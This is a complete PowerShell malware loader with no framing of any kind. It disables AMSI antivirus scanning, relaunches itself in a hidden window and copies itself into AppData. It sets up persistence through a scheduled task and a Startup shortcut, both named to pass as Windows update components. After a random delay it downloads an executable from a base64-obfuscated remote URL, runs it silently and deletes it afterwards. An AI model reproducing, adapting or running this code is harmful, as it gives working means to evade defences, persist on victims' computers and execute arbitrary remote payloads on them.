$ErrorActionPreference = 'SilentlyContinue'

# AMSI BYPASS
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

# HIDDEN RELAUNCH (now enabled)
if ($Host.Name -eq 'ConsoleHost') {
    Start-Job -ScriptBlock { param($p) Start-Process powershell -Arg "-ep Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$p`"" -WindowStyle Hidden } -ArgumentList $MyInvocation.MyCommand.Path | Out-Null
    exit
}

# SELF-PRESERVATION
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if ($currentPath) { Copy-Item $currentPath $Destination -Force }
    return $Destination
}
$scriptPath = Save-ScriptToDisk $localPath

# PERSISTENCE
$taskName = "WindowsUpdateTask"
if (-not (Get-ScheduledTask -TaskName $taskName -EA 0)) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $enc"
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
}

$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wsh = New-Object -ComObject WScript.Shell
    $sc = $wsh.CreateShortcut($lnkPath)
    $sc.TargetPath = "powershell.exe"
    $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $sc.WindowStyle = 7
    $sc.Save()
}

# DELAY
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# DOWNLOAD + EXECUTE
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
$exePath = "$cache\WindowsUpdateHelper.exe"
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))

if (-not (Test-Path $exePath)) {
    try { (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath) } catch {}
}

if (Test-Path $exePath) {
    try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" | Out-Null } catch {}
    try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"",0,$false) } catch {}
    try { Start-Process $exePath -WindowStyle Hidden } catch {}
}

# Self-clean
Start-Job -ScriptBlock { param($e) Start-Sleep 300; Remove-Item $e -Force } -ArgumentList $exePath | Out-Null
